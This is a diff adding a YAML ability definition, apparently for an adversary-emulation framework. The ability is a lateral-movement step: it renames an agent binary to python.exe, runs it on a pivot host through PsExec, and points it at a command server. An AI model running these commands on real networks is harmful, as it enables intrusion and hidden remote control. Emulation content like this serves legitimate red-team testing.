@@ -1,0 +1,59 @@
+ability_id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
+access: {}
+additional_info: {}
+buckets:
+- lateral-movement
+delete_payload: true
+description: Copy Sandcat file using PsExec
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+
+    set-location "C:\Program Files\SysinternalsSuite\";
+
+    .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d
+    -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+
+    tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - sandcat.go-windows-upx
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+
+    set-location "C:\Program Files\SysinternalsSuite\";
+
+    .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d
+    -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+
+    tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - sandcat.go-windows-upx
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Copy Sandcat File
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: lateral-movement
+technique_id: T1105
+technique_name: Ingress Tool Transfer
